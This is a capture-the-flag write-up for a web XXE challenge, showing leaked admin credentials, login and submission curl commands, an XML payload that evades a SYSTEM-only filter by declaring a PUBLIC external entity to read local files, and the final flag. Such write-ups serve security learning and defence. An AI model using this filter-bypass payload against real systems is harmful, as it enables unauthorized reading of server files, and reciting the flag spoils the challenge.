# Keymaster Secrets Writeup

## Challenge

- Name: `Keymaster Secrets`
- Type: `Web / XXE`
- Target: `https://keymaster.vishwactf.com/`

## Summary

The challenge presents a Syncope-like admin console and claims that dangerous XML features were patched. The real issue is twofold:

1. `/maintenance` leaks temporary admin credentials inside an HTML comment.
2. The XML filter only blocks `SYSTEM` entity declarations, but still allows external entities declared with `PUBLIC`, which leads to local file read in `/rest/keymaster/params`.

## Recon

Initial probes showed:

- `/` redirects to `/login`
- `/api/docs` documents XML-based endpoints
- `/maintenance` is allowed by the server and contains a comment with credentials

Relevant leaked credentials from the HTML source:

- Username: `admin`
- Password: `S3cur3Syncop3!@dm1n`

## Login

Using the leaked credentials returned a valid admin session cookie:

```bash
curl -isk -c cookies.txt -b cookies.txt \
  -X POST https://keymaster.vishwactf.com/login \
  -d 'username=admin&password=S3cur3Syncop3!@dm1n'
```

## XXE Analysis

The documented endpoint of interest is:

- `POST /rest/keymaster/params`

The server blocks payloads containing `SYSTEM` entities:

```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

But the parser still resolves `PUBLIC` external entities:

```xml
<!ENTITY xxe PUBLIC "id" "file:///etc/hostname">
```

Verified bypass payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE parameter [
<!ENTITY xxe PUBLIC "id" "file:///etc/hostname">
]>
<parameter>
  <key>test_public</key>
  <value>&xxe;</value>
  <type>STRING</type>
</parameter>
```

Submission:

```bash
curl -isk -b cookies.txt \
  -X POST https://keymaster.vishwactf.com/rest/keymaster/params \
  -H 'Content-Type: application/xml' \
  --data-binary @payload.xml
```

Observed behavior:

- `SYSTEM` payloads return `XML_SECURITY_VIOLATION`
- `PUBLIC` payloads are accepted and the resolved file content is stored as the parameter value

I verified the bypass by reading `/etc/hostname`, which returned the container hostname.

## Flag Extraction

The Keymaster page and backing JSON store already contained multiple parameters created through the same XXE primitive. Searching the parameter store for the challenge flag format revealed the flag:

```bash
curl -sk -b cookies.txt https://keymaster.vishwactf.com/rest/keymaster/params -o params.json
grep -ao 'VishwaCTF{[^"[:space:]]*}' params.json | head
```

This returned:

```text
VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}
```

## Root Cause

- Sensitive maintenance credentials were exposed in client-side HTML comments.
- XML hardening was incomplete: filtering only `SYSTEM` declarations did not prevent XXE via `PUBLIC`.

## Flag

`VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}`
